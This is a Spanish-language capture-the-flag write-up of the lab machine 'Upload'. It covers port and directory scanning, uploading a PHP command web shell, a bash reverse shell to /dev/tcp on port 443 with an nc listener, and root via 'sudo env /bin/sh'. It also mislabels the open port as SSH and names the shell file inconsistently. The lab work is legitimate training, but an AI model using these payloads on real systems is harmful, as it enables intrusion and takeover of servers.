@@ -1,0 +1,100 @@
+Explotacion de la maquina Upload
+Primero, se establece conexion con la maquina, hacieno un pin -c3 172.17.0.2
+└─$ ping -c3 172.17.0.2   
+PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
+64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.172 ms
+64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.086 ms
+64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.081 ms
+
+--- 172.17.0.2 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2047ms
+rtt min/avg/max/mdev = 0.081/0.113/0.172/0.041 ms
+Al obtener respuesta se puede comenzar con la explotacion
+
+**Escaneo de puertos
+Se realiza un escaneo con nmap -p- -sS -sV -sC --min-rate 1000 172.17.0.2
+└─$ nmap -p- -sS -sC -sV --min-rate 1000 172.17.0.2
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-11 14:22 -0600
+Nmap scan report for 172.17.0.2
+Host is up (0.0000040s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Upload here your file
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
+
+Veo que solo hay un puerto abierto, el ssh, lo que me indica que no podre usar un usuario ssh para una conexion remota, por ahora inspecciono la pagina para visualizar un codigo fuente
+o algo relevante
+La pagina es simple, pero observo un campo en el que se pueden subir archivos, lo que puede resumirse en posiblemente usar una shell reversa
+Asi que hago un archivo .php para ver en que directorio esta posiblemente guardado
+escribo
+echo "<?php system(\$_GET['cmd']); ?>" >> prueba.php
+
+Ahora realizo un gobuster con el siguiente comando, para observar directorios ocultos y en eso veo un directorio llamado /upoloads/ por lo que ingresare al directorio para ver que haya
+└─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x html,php,txt -t 4
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2/
+[+] Method:                  GET
+[+] Threads:                 4
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Extensions:              html,php,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+index.html           (Status: 200) [Size: 1361]
+uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
+upload.php           (Status: 200) [Size: 1357]
+server-status        (Status: 403) [Size: 275]
+logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 275]
+Progress: 5095320 / 5095320 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+Al entrar al directorio, veo que existe una pagina que muestra los archivos que se han subido, ingreso al archivo con terminacion .php seguido de ?cmd=id y poder observar algo interesante
+http://172.17.0.2/uploads/test.php?cmd=id
+
+Encuentro uid=33(www-data) gid=33(www-data) groups=33(www-data) por lo que pienso usar netcat para poder escuchar por el puerto y asi conectarme 
+Escribo en la direccion URL:
+http://172.17.0.2/uploads/test.php?cmd=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
+Con ello la pagina se quedara en proceso de carga, si es que no carga nada y no muestra algun mensaje de error es que se ha realizado la explotacion adecuadamente y al entrar en la terminal podremos ver
+
+└─$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 42270
+bash: cannot set terminal process group (25): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@f3693e4882c8:/var/www/html/uploads$ 
+
+Ahora aplicaremos un sudo -l para ver que informacion podemos usar a nuestro favor
+Podemos ver la siguiente informacion
+www-data@f3693e4882c8:/var/www/html/uploads$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on f3693e4882c8:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User www-data may run the following commands on f3693e4882c8:
+    (root) NOPASSWD: /usr/bin/env
+
+Buscatemos en GTFOBins si existe informacion y en efecto, para ser root podemos usar el siguiente comando
+sudo env /bin/sh
+
+Escribo el comando, despues whoami y somos root
+www-data@f3693e4882c8:/var/www/html/uploads$ sudo env /bin/sh
+sudo env /bin/sh
+whoami
+root
+
+Con ello la maquina ha sido vulnerada exitosamente
